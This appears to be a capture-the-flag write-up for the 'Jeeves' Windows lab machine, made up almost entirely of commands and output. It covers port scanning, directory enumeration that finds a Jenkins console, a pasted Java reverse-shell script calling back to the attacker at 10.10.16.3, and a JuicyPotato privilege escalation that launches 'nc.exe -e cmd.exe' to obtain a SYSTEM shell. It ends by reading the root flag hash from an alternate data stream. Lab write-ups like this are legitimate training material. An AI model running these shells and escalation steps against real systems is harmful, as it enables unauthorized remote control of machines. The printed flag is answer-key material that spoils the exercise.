# Jeeves

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -p- -sV -T4 10.10.10.63
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-11-01 21:58 EDT
Nmap scan report for 10.10.10.63
Host is up (0.072s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m00s
| smb2-time: 
|   date: 2025-11-02T07:00:59
|_  start_date: 2025-11-02T06:56:59
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u <http://10.10.10.63:50000> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.10.10.63:50000>
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> <http://10.10.10.63:50000/askjeeves/>]

```

We find a jenkins page. We can access the script console. We get a reverse shell

```bash
String host="10.10.16.3";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
C:\\Users\\kohsuke>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

```bash
C:\\Users\\kohsuke>.\\juicy.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\Users\\kohsuke\\nc.exe -e cmd.exe 10.10.16.3 5555" -t *
.\\juicy.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\Users\\kohsuke\\nc.exe -e cmd.exe 10.10.16.3 5555" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM

[+] CreateProcessWithTokenW OK
```

```bash
┌──(kali㉿kali)-[/opt/windows/potato]
└─$ nc -lnvp 5555                               
listening on [any] 5555 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.63] 49715
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
nt authority\\system
```

```bash
C:\\Users\\Administrator\\Desktop>dir 
dir 
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\\Users\\Administrator\\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,635,616,256 bytes free

C:\\Users\\Administrator\\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

```bash
C:\\Users\\Administrator\\Desktop>dir /R  
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\\Users\\Administrator\\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
```

```bash
C:\\Users\\Administrator\\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```
